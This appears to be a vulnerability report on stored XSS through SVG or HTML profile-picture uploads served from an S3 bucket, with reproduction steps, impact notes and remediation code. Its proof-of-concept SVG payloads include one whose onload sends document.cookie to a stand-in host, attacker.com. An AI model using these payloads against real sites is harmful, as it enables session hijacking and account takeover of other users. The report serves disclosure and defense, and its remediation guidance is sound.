# Stored XSS via S3 Bucket — Profile Picture Upload

**Severity:** Medium — CVSS 3.1: AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (6.1)
**Class:** CWE-79 — Improper Neutralization of Input During Web Page Generation (Stored XSS)
**Target:** Profile picture upload endpoint / S3 bucket serving user-uploaded content
**Status:** Confirmed

---

## Summary

The application allows users to upload profile pictures that are stored in an S3 bucket and served directly to other users' browsers. The upload functionality fails to validate the file's Content-Type against its actual content, allowing an attacker to upload an HTML or SVG file containing JavaScript. When another user's browser loads the "profile picture" directly (e.g., by clicking on it or via a direct S3 URL), the malicious script executes in the context of the S3 origin.

---

## Steps to Reproduce

1. **Authenticate** to the target application with a valid user account.

2. **Navigate** to the profile settings / avatar upload page.

3. **Intercept** the profile picture upload request using a proxy (e.g., Burp Suite).

4. **Replace** the image file content with a malicious SVG payload:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <text x="10" y="20">XSS via Profile Picture</text>
</svg>
```

Or an HTML payload (if the bucket serves arbitrary Content-Types):

```html
<html>
<body>
<script>alert(document.domain)</script>
</body>
</html>
```

5. **Modify** the request (if needed):
   - Change the `Content-Type` header to `image/svg+xml` (for SVG) or `text/html` (for HTML).
   - Change the filename extension to `.svg` or `.html`.

6. **Forward** the modified upload request.

7. **Retrieve the direct S3 URL** of the uploaded "profile picture" (inspect the page source, network traffic, or API response for the S3 object URL — typically something like `https://<bucket>.s3.amazonaws.com/profiles/<user-id>/avatar.svg`).

8. **Open the S3 URL directly** in a browser (or send it to a victim). The JavaScript payload executes.

---

## Proof of Concept

### Request (Upload)

```http
PUT /api/v1/user/profile/picture HTTP/1.1
Host: api.target.com
Authorization: Bearer <token>
Content-Type: image/svg+xml
Content-Disposition: attachment; filename="avatar.svg"

<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/steal?cookie='+document.cookie)">
  <circle cx="50" cy="50" r="40" fill="red"/>
</svg>
```

### Response (S3 URL returned)

```json
{
  "status": "success",
  "avatar_url": "https://bucket-name.s3.amazonaws.com/users/12345/avatar.svg"
}
```

### Visiting the S3 URL triggers the JavaScript

The browser renders the SVG, the `onload` fires, and the attacker's server receives the request with the victim's cookies (if the S3 bucket shares the application's origin or cookies are scoped broadly).

---

## Impact

- **Session Hijacking:** If the S3 bucket is on the same origin or a subdomain, the attacker can steal session tokens/cookies from any user who views the profile picture directly.
- **Phishing:** The attacker can render a convincing phishing page at a trusted S3 URL belonging to the target organization.
- **Account Takeover:** Combined with CSRF token theft, the attacker could change victim account details.
- **Wormable XSS:** If the profile picture URL is rendered inline (e.g., in comments, messages, or a user directory), every viewer is affected — the XSS becomes self-propagating.

**Note on S3 origin context:** If the S3 bucket is on a completely separate origin (e.g., `*.s3.amazonaws.com`) with no sensitive cookies, the direct impact is limited to phishing under a trusted-looking URL. Severity increases significantly if:
- The bucket is behind CloudFront on a subdomain of the application (e.g., `assets.target.com`)
- The application embeds profile images via `<embed>`, `<object>`, or `<iframe>` instead of `<img>`
- The `Content-Disposition` header is missing (browser renders inline instead of downloading)

---

## Remediation

1. **Validate Content-Type server-side:** Check the actual file content (magic bytes) against the declared MIME type. Only allow known safe image formats (`image/png`, `image/jpeg`, `image/gif`, `image/webp`). Reject SVG and HTML entirely for user-uploaded profile pictures.

```python
import magic

ALLOWED_TYPES = {'image/png', 'image/jpeg', 'image/gif', 'image/webp'}

def validate_upload(file_bytes, declared_type):
    detected = magic.from_buffer(file_bytes, mime=True)
    if detected not in ALLOWED_TYPES:
        raise ValueError(f"File type {detected} not allowed")
```

2. **Set `Content-Type` and `Content-Disposition` on S3 objects:**

```python
s3.put_object(
    Bucket=bucket,
    Key=key,
    Body=image_bytes,
    ContentType='image/png',  # Force safe type
    ContentDisposition='attachment',  # Prevent inline rendering
)
```

3. **Serve user content from an isolated origin:** Use a separate domain (e.g., `user-content.example.net`) with no cookies, not a subdomain of the application.

4. **Set a restrictive Content Security Policy on the S3 bucket/CloudFront distribution:**

```
Content-Security-Policy: default-src 'none'; img-src 'self'; style-src 'none'; script-src 'none'
```

5. **Re-encode uploaded images:** Process all uploads through an image library (e.g., Pillow, Sharp) and re-save as a raster format. This strips any embedded scripts.

```python
from PIL import Image
from io import BytesIO

def sanitize_image(file_bytes):
    img = Image.open(BytesIO(file_bytes))
    output = BytesIO()
    img.save(output, format='PNG')
    return output.getvalue()
```

---

## References

- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [AWS S3 Security Best Practices](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html)
- [PortSwigger: File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [HackerOne: Stored XSS via SVG Upload](https://hackerone.com/reports/148853)
